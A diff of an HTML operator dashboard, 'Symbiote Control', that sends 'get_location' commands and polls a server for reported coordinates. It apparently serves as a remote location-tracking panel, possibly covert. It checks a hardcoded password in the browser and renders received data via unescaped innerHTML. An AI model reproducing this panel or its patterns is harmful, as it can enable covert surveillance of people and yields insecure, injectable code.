@@ -3,205 +3,270 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Control Panel</title>
+    <title>Admin Dashboard</title>
     
-    <!-- ================================== -->
-    <!-- ========= CSS का हिस्सा ========= -->
-    <!-- ================================== -->
+    <!-- सुंदर आइकॉन के लिए Font Awesome लाइब्रेरी -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    
     <style>
-        body {
-            font-family: 'Courier New', Courier, monospace;
-            background-color: #1a1a1a;
-            color: #00ff00;
-            margin: 0;
-            padding: 20px;
+        /* CSS का हिस्सा - नया और सुंदर डिज़ाइन */
+        :root {
+            --bg-dark: #1a1f2c;
+            --bg-light: #272e3d;
+            --primary-color: #007bff;
+            --text-light: #f0f2f5;
+            --text-secondary: #a9b3c1;
+            --border-color: #3a4152;
+            --success-color: #28a745;
+            --error-color: #dc3545;
         }
 
-        /* --- Login Screen Styles --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-light);
+            font-size: 16px;
+        }
+
+        /* --- लॉगिन स्क्रीन --- */
         #login-container {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #1a1a1a;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background-color: var(--bg-dark);
             display: flex;
             justify-content: center;
             align-items: center;
-            flex-direction: column;
-            z-index: 10;
+            z-index: 100;
         }
-        #login-box {
-            padding: 30px;
-            border: 1px solid #00ff00;
-            background-color: #111;
+        .login-box {
+            background-color: var(--bg-light);
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            text-align: center;
+            border: 1px solid var(--border-color);
         }
-        #password-input {
-            background-color: #333;
-            border: 1px solid #00ff00;
-            color: #00ff00;
-            padding: 10px;
-            font-size: 16px;
+        .login-box h2 {
+            margin-bottom: 20px;
         }
-        #login-button {
-            background-color: #00ff00;
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            background-color: var(--bg-dark);
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            color: var(--text-light);
+            font-size: 1em;
+        }
+        .login-box button {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--primary-color);
             border: none;
-            color: #1a1a1a;
-            padding: 10px 20px;
-            cursor: pointer;
+            border-radius: 5px;
+            color: white;
+            font-size: 1.1em;
             font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .login-box button:hover {
+            background-color: #0056b3;
         }
         #login-error {
-            color: red;
-            margin-top: 10px;
+            color: var(--error-color);
+            margin-top: 15px;
             display: none;
         }
 
-        /* --- Dashboard Styles --- */
-        #dashboard {
-            display: none; /* Initially hidden */
+        /* --- मुख्य डैशबोर्ड --- */
+        .hidden { display: none !important; }
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 350px 1fr;
+            height: 100vh;
         }
-
-        h1, h2 {
-            border-bottom: 1px solid #00ff00;
-            padding-bottom: 10px;
+        .control-panel {
+            background-color: var(--bg-light);
+            padding: 20px;
+            border-right: 1px solid var(--border-color);
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
         }
-
-        .command-section button {
-            background-color: #333;
-            border: 1px solid #00ff00;
-            color: #00ff00;
+        .data-feed {
+            padding: 20px;
+            overflow-y: auto;
+        }
+        header {
+            text-align: center;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--border-color);
+        }
+        header h1 {
+            font-size: 1.5em;
+        }
+        .card {
+            background-color: var(--bg-dark);
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+        }
+        .card h3 {
+            margin-bottom: 15px;
+            color: var(--text-secondary);
+        }
+        .card i {
+            margin-right: 10px;
+        }
+        .command-btn {
+            width: 100%;
             padding: 15px;
-            font-size: 18px;
+            font-size: 1em;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 5px;
             cursor: pointer;
-            margin: 10px;
+            text-align: left;
+            transition: background-color 0.2s;
         }
-        .command-section button:hover {
-            background-color: #00ff00;
-            color: #1a1a1a;
+        .command-btn:hover {
+            background-color: #0069d9;
         }
-
         #status-log {
-            margin-top: 20px;
-            border: 1px solid #555;
+            height: 200px;
+            overflow-y: auto;
+            font-size: 0.9em;
+            color: var(--text-secondary);
+        }
+        #status-log div {
+            padding: 5px 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+        .data-feed h2 {
+            margin-bottom: 20px;
+        }
+        #data-display {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        .data-item {
+            background-color: var(--bg-light);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 15px;
+            animation: fadeIn 0.5s ease;
+        }
+        .data-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            color: var(--text-secondary);
+        }
+        .data-header .type {
+            font-weight: bold;
+            color: var(--text-light);
+            font-size: 1.1em;
+        }
+        .data-body {
+            font-family: 'Courier New', Courier, monospace;
+            word-wrap: break-word;
+            background-color: var(--bg-dark);
             padding: 10px;
-            height: 100px;
-            overflow-y: scroll;
-            background-color: #111;
+            border-radius: 5px;
+        }
+        .data-item.error .data-header .type {
+            color: var(--error-color);
         }
         
-        #data-display {
-            margin-top: 20px;
-            border: 1px solid #555;
-            padding: 10px;
-            height: 400px;
-            overflow-y: scroll;
-            background-color: #111;
-        }
-
-        .data-item {
-            border-bottom: 1px dashed #333;
-            padding: 8px;
-            margin-bottom: 8px;
-        }
-        .data-item .type {
-            font-weight: bold;
-        }
-        .data-item .timestamp {
-            font-size: 0.8em;
-            color: #aaa;
-        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
-    <!-- ============================================ -->
-    <!-- ========= LOGIN SCREEN का हिस्सा =========== -->
-    <!-- ============================================ -->
+    <!-- लॉगिन स्क्रीन -->
     <div id="login-container">
-        <div id="login-box">
-            <h2>Enter Access Code</h2>
-            <input type="password" id="password-input" placeholder="Password...">
-            <button id="login-button">Login</button>
-            <p id="login-error">Incorrect Password</p>
+        <div class="login-box">
+            <h2><i class="fa-solid fa-lock"></i> Admin Panel</h2>
+            <input type="password" id="password-input" placeholder="Access Code">
+            <button id="login-button">Unlock</button>
+            <p id="login-error">Access Denied</p>
         </div>
     </div>
 
-
-    <!-- ============================================ -->
-    <!-- ========= DASHBOARD का हिस्सा ============== -->
-    <!-- ============================================ -->
-    <div id="dashboard">
-        <h1>> Symbiote Protocol // Command Center</h1>
-
-        <div class="command-section">
-            <h2>> Commands</h2>
-            <button id="getLocationBtn">Execute: Get_Location</button>
-            <!-- भविष्य के कमांड के लिए बटन यहाँ जोड़ें -->
-        </div>
-
-        <div>
-            <h2>> System Log</h2>
-            <div id="status-log"></div>
-        </div>
+    <!-- मुख्य डैशबोर्ड -->
+    <main id="dashboard" class="dashboard-grid hidden">
         
-        <div>
-            <h2>> Received Data</h2>
+        <!-- बायां पैनल: कमांड्स और लॉग -->
+        <aside class="control-panel">
+            <header>
+                <h1><i class="fa-solid fa-terminal"></i> Symbiote Control</h1>
+            </header>
+            
+            <div class="card">
+                <h3><i class="fa-solid fa-paper-plane"></i> Send Command</h3>
+                <button id="getLocationBtn" class="command-btn"><i class="fa-solid fa-location-crosshairs"></i> Get Location</button>
+            </div>
+            
+            <div class="card" style="flex-grow: 1;">
+                <h3><i class="fa-solid fa-shield-halved"></i> System Log</h3>
+                <div id="status-log"></div>
+            </div>
+        </aside>
+        
+        <!-- दायां पैनल: प्राप्त डेटा -->
+        <section class="data-feed">
+            <h2><i class="fa-solid fa-database"></i> Live Data Feed</h2>
             <div id="data-display"></div>
-        </div>
-    </div>
+        </section>
+        
+    </main>
 
 
-    <!-- ====================================== -->
-    <!-- ========= JAVASCRIPT का हिस्सा ========= -->
-    <!-- ====================================== -->
     <script>
-        // ===============================================
-        //  STEP 0: ज़रूरी चीजों को तैयार रखना
-        // ===============================================
-
+        // जावास्क्रिप्ट का हिस्सा (लॉजिक वही, सिर्फ डेटा दिखाने का तरीका बदला है)
+        
         // !!! अपना गुप्त पासवर्ड यहाँ सेट करें !!!
         const ADMIN_PASSWORD = "your_secret_password_123";
 
-        // Login elements
         const loginContainer = document.getElementById('login-container');
         const passwordInput = document.getElementById('password-input');
         const loginButton = document.getElementById('login-button');
         const loginError = document.getElementById('login-error');
-
-        // Dashboard elements
         const dashboard = document.getElementById('dashboard');
         const getLocationBtn = document.getElementById('getLocationBtn');
         const statusLog = document.getElementById('status-log');
         const dataDisplay = document.getElementById('data-display');
         
-        let displayedDataCount = 0; // ट्रैक रखें कि कितना डेटा दिखाया जा चुका है
+        let displayedDataCount = 0;
 
-        // ===============================================
-        //  STEP 1: लॉगिन को संभालना
-        // ===============================================
         loginButton.addEventListener('click', handleLogin);
         passwordInput.addEventListener('keyup', (event) => {
-            if (event.key === 'Enter') {
-                handleLogin();
-            }
+            if (event.key === 'Enter') handleLogin();
         });
 
         function handleLogin() {
             if (passwordInput.value === ADMIN_PASSWORD) {
-                loginContainer.style.display = 'none';
-                dashboard.style.display = 'block';
-                logStatus('Access granted. Welcome.');
-                // डेटा लाना शुरू करें
+                loginContainer.classList.add('hidden');
+                dashboard.classList.remove('hidden');
+                logStatus('Access granted. System online.', 'success');
                 startFetchingData();
             } else {
                 loginError.style.display = 'block';
             }
         }
         
-        // ===============================================
-        //  STEP 2: कमांड भेजना
-        // ===============================================
         getLocationBtn.addEventListener('click', () => {
             sendCommand({ command: 'get_location' });
         });
@@ -215,25 +280,19 @@
                     body: JSON.stringify(commandObject)
                 });
                 const result = await response.json();
-
                 if (response.ok) {
-                    logStatus('Command sent successfully.');
+                    logStatus('Command sent successfully.', 'success');
                 } else {
-                    logStatus(`Error: ${result.message}`);
+                    logStatus(`Error: ${result.message}`, 'error');
                 }
             } catch (error) {
-                logStatus('Network error. Failed to send command.');
-                console.error('Send command error:', error);
+                logStatus('Network error. Failed to send command.', 'error');
             }
         }
 
-        // ===============================================
-        //  STEP 3: सर्वर से डेटा प्राप्त करना और दिखाना
-        // ===============================================
         function startFetchingData() {
-            // हर 5 सेकंड में नई जानकारी के लिए सर्वर से पूछें
-            setInterval(fetchData, 5000);
-            fetchData(); // तुरंत पहली बार भी पूछें
+            setInterval(fetchData, 5000); // हर 5 सेकंड में
+            fetchData();
         }
 
         async function fetchData() {
@@ -241,48 +300,50 @@
                 const response = await fetch('/get-reported-data');
                 const data = await response.json();
                 
-                // केवल नया डेटा दिखाएं
                 if (data.length > displayedDataCount) {
                     const newData = data.slice(displayedDataCount);
                     displayData(newData);
                     displayedDataCount = data.length;
                 }
-                
             } catch (error) {
-                console.error('Fetch data error:', error);
-                logStatus('Error fetching data from server.');
+                logStatus('Error fetching data from server.', 'error');
             }
         }
 
+        // डेटा दिखाने का नया और बेहतर तरीका
         function displayData(newDataArray) {
             newDataArray.forEach(item => {
-                const itemDiv = document.createElement('div');
-                itemDiv.className = 'data-item';
+                const itemCard = document.createElement('div');
+                itemCard.className = `data-item ${item.type === 'error' ? 'error' : ''}`;
 
-                let content = `
-                    <span class="timestamp">[${new Date(item.timestamp).toLocaleString()}]</span><br>
-                    <span class="type">${item.type.toUpperCase()}:</span>
-                `;
+                let iconClass = 'fa-solid fa-question';
+                if (item.type === 'location') iconClass = 'fa-solid fa-location-dot';
+                if (item.type === 'error') iconClass = 'fa-solid fa-triangle-exclamation';
 
+                let bodyContent = '';
                 if (item.type === 'location') {
-                    content += ` Lat: ${item.latitude}, Lon: ${item.longitude} (Accuracy: ${item.accuracy}m)`;
+                    bodyContent = `Latitude: ${item.latitude}<br>Longitude: ${item.longitude}<br>Accuracy: ${item.accuracy} meters`;
                 } else {
-                    content += ` ${item.message || JSON.stringify(item)}`;
+                    bodyContent = item.message || JSON.stringify(item, null, 2);
                 }
 
-                itemDiv.innerHTML = content;
-                dataDisplay.prepend(itemDiv); // नया डेटा सबसे ऊपर दिखाएं
+                itemCard.innerHTML = `
+                    <div class="data-header">
+                        <span class="type"><i class="${iconClass}"></i> ${item.type.toUpperCase()}</span>
+                        <span class="timestamp"><i class="fa-regular fa-clock"></i> ${new Date(item.timestamp).toLocaleString()}</span>
+                    </div>
+                    <div class="data-body">${bodyContent}</div>
+                `;
+                dataDisplay.prepend(itemCard);
             });
         }
         
-        // ===============================================
-        //  HELPER: लॉग में संदेश दिखाना
-        // ===============================================
-        function logStatus(message) {
+        function logStatus(message, type = 'info') {
             const time = new Date().toLocaleTimeString();
             const logEntry = document.createElement('div');
-            logEntry.textContent = `[${time}] ${message}`;
-            statusLog.prepend(logEntry); // नया लॉग सबसे ऊपर दिखाएं
+            let color = type === 'success' ? 'var(--success-color)' : type === 'error' ? 'var(--error-color)' : 'inherit';
+            logEntry.innerHTML = `<span style="color:${color}">[${time}] ${message}</span>`;
+            statusLog.prepend(logEntry);
         }
 
     </script>
